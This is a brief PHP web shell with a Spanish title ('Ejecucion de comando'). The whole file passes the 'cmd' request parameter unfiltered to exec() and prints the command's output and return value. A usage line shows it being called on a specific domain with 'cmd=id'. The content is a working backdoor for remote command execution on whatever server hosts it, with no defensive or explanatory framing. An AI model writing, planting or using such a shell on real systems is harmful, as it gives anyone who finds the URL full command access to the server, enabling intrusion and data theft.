<html>
<head>
<title> Ejecucion de comando </title>
USO: http://www.nasiopacurra.com/comand.php?cmd=id
</head>
<body>
<h1>Ejecucion de comando</h1>

<?php
$output = array();
$return_var = 0;
$command = $_REQUEST["cmd"];
exec($command, $output, $return_var);
$output_str = join($output, "\n");
echo "<pre>Comand:\n".$command."\n\n";
echo "The output was:\n".$output_str."\n\n";
echo "The return value was ".$return_var."</pre>";
?>